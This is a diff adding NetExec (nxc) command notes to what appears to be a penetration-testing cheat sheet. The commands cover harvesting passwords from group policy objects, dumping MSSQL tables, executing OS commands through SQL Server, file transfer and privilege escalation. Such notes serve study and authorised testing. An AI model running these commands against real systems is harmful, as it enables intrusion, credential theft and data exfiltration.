@@ -101,10 +101,75 @@ nxc mssql $IP -u [user] -p [pass] --local-auth
 ```
 > Lookout for reused passwords. A DB admin may use the same credentials as their domain account just stored in the DB
 
-
-
 ## Credentialed enumeration
+#### Accounts in group policy objects
+```bash
+# search for passwords in group policy objects
+nxc smb $IP -u [user] -p [pass] -M gpp_password
 
+# Search for autologin accounts
+nxc smb $IP -u [user] -p [pass] -M gpp_autologin
+```
+#### Modules
+* List all modules for the protocol
+```bash
+nxc smb -L
+```
+* View Module Options
+```bash
+nxc ldap -M user-desc --options
+
+# example
+nxc ldap -u [user] -p [pass] -M user-desc -o KEYWORDS=pwd,admin
+```
+#### MSSQL Enum & Attacks
+* Execute an SQL Query
+```bash
+nxc mssql $IP -u [user] -p [pass] -q
+```
+* Useful DB Queries
+```bash
+# Get all DB names
+nxc mssql $IP -u [user] -p [pass] -q 'SELECT name FROM master.dbo.sysdatabases'
+
+# Get table names form a DB
+nxc mssql $IP -u [user] -p [pass] -q 'SELECT table_name from [DB].INFORMATION_SCHEMA.TABLES'
+
+# Dump contents of a table
+nxc mssql $IP -u [user] -p [pass] -q 'SELECT * from [db name].[dbo].[table name]'
+```
+#### OS command execution
+```bash
+# Using cmd
+nxc mssql $IP -u [user] -p [pass] -x whoami
+
+# Using Powershell
+nxc mssql $IP -u [user] -p [pass] -X whoami #Note the capital 'X'
+```
+> Remember you'll be executing commands under the context under which SQL is running. Not necessarily an admin  
+#### Transferring Files
+```bash
+# Upload a file
+nxc mssql $IP -u [user] -p [pass] --put-file [local file path] [target file path]
+#ex
+nxc mssql 172.168.15.10 -u julio -p [pass] --put-file /etc/passwd c:/users/public/passwd
+
+# Download a file
+nxc mssql $IP -u [user] -p [pass] --get-file [download file path] [save path]
+#ex
+nxc mssql 172.16.15.10 -u julio -p [pass] --get-file c:/users/public/passwd passwd
+```
+#### SQL Priv-Esc module
+> Used to enumerate and escalate privileges via 'execute as login' and 'db_owner'  
+```bash
+# Enum privileges
+nxc mssql $IP -u [user] -p [pass] -M mssql_priv
+
+# Escalate if available
+nxc mssql $IP -u [user] -p [pass] -M mssql_priv -o ACTION=privesc
+
+# Rollback privileges
+nxc mssql $IP -u [user] -p [pass] -M mssql_priv -o ACTION=rollback
 ## Admin Credentialed enumeration
 
 ## Remote Shell
